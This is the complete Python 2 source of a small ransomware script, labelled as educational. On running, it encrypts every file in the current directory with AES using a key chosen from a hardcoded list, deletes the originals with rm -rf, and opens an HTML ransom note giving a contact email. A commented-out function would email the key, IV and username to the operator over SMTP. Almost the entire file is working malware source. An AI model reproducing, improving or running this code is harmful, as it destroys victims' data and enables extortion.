#!/usr/bin/env python
#!/usr/bin/env python
# A ransomware written in python for educational purposes.
# By Mateus-n00b
# TIP: Before remove the ransomware from system run this cmd, shred <file.py>.
#        _______  _______ ___.
#   ____ \   _  \ \   _  \\_ |__
#  /    \/  /_\  \/  /_\  \| __ \
# |   |  \  \_/   \  \_/   \ \_\ \
# |___|  /\_____  /\_____  /___  /
#      \/       \/       \/    \/
#
#
# Version 3.0
# 13/01/2017
#
# License GPLv2
#

import os,sys,time
import smtplib
import random
import hashlib, getpass

# Looking for the pycrypto
try:
	from Crypto.Cipher import AES
except:
	#   os.system('pip install pycrypto')
	print "[-] Install the pycrypto!"
	sys.exit(0)

from Crypto.Random import random

'''+++++++++++++++++++++++++ VARS +++++++++++++++++++++++++'''
PASSWORD 		= 				""
IV				=				""
USER			=				""
FILES = []
KEYS = ['68b329da9893e340', '4e5dc3caa06fa07c',
'ba0cc7fbd788f3aa', '6fad925d11791093','93c2f537558d98f8', '7755cd776caa84bc', '41e4d89b2ae8a90f']

'''+++++++++++++++++++++++++ INITIALIZING VARS +++++++++++++++++++++++++'''

seed = str(random.randint(0,35535))
HASH = hashlib.md5(seed)
IV = random.choice(KEYS)

seed = str(random.randint(0,35535))
HASH = hashlib.md5(seed)
PASSWORD = str(random.choice(KEYS))
USER = os.getenv('USER')

print "IV=> %s\nPASSWORD=> %s" % (IV,PASSWORD)

'''+++++++++++++++++++++++++ EMAIL FUNCTION +++++++++++++++++++++++++'''
def email_function():
	myemail = raw_input("My email>> ")
	pswd = getpass.getpass()
	try:
		mailer = smtplib.SMTP('smtp.gmail.com',25)
		mailer.ehlo()
		mailer.starttls()
		mailer.login(myemail,pswd)
		mailer.sendmail('H4CK3D',myemail,"Subject: \nPassword %s\nIV %s\nUSER %s" % (PASSWORD,IV,USER))
		time.sleep(1)
		mailer.quit()
	except:
		pass

'''+++++++++++++++++++++++++ ENCRYPT FUNCTION +++++++++++++++++++++++++'''
def encrypt():
	os.system('clear||cls')
	print "[!] This should take a long time..."

	bar = AES.new(PASSWORD, AES.MODE_CBC,str(IV))

	# Getting the files to encrypt
	os.chdir('.')
	os.system('[ -f /tmp/h4ck3d.txt ] && rm /tmp/h4ck3d.txt')
	os.system('for x in *; do [ -f "$x" ] && echo $x >> /tmp/h4ck3d.txt; done')

	to_encrypt = open('/tmp/h4ck3d.txt','r')

	for x in to_encrypt.readlines():
		x = x.rstrip()
		to_read = open("%s" % x, 'r')
		var = open("%s/%s_h4ck3d" % (os.getenv('PWD'),x),'w')
		cont = 0
		foo = ""
		try:
			for i in to_read.read():
				foo += i
			while len(foo)%16 != 0:
					foo +=' '

			aux = bar.encrypt(str(foo))
			var.write(str(aux))
			#var.write('\n')


			FILES.append(x)
			var.close()
			to_read.close()
			os.system("rm -rf %s" % (x))

		except:
			#print "[-] Error to encrypt %s" % x
			pass

	# email_function()
	time.sleep(2)
	notification()

'''+++++++++++++++++++++++++ NOTIFICATION FUNCTION +++++++++++++++++++++++++'''
def notification():
	msg = " <!DOCTYPE html>\
	<html>\
	<head>\
	<title>HELLO %s </title>\
	</head>\
	<body>\
	\
	<p>Oops! We've got a little problem here! It's seems that we have a ransomware. </p>\
	<p>Talk to: foobarnoobr@gmail.com</p>\
	\
	</body>\
	</html> " % os.getenv('USER')

	foo = open("%s/hello.html" % os.getenv('HOME'),'w')
	foo.write(msg)
	foo.close()
	os.system("firefox %s/hello.html" % os.getenv('HOME'))

'''++++++++++++++++++++++++++++++++++ CALL THE FUNCTION +++++++++++++++++++++++++++++++++++++++++++++'''
encrypt()
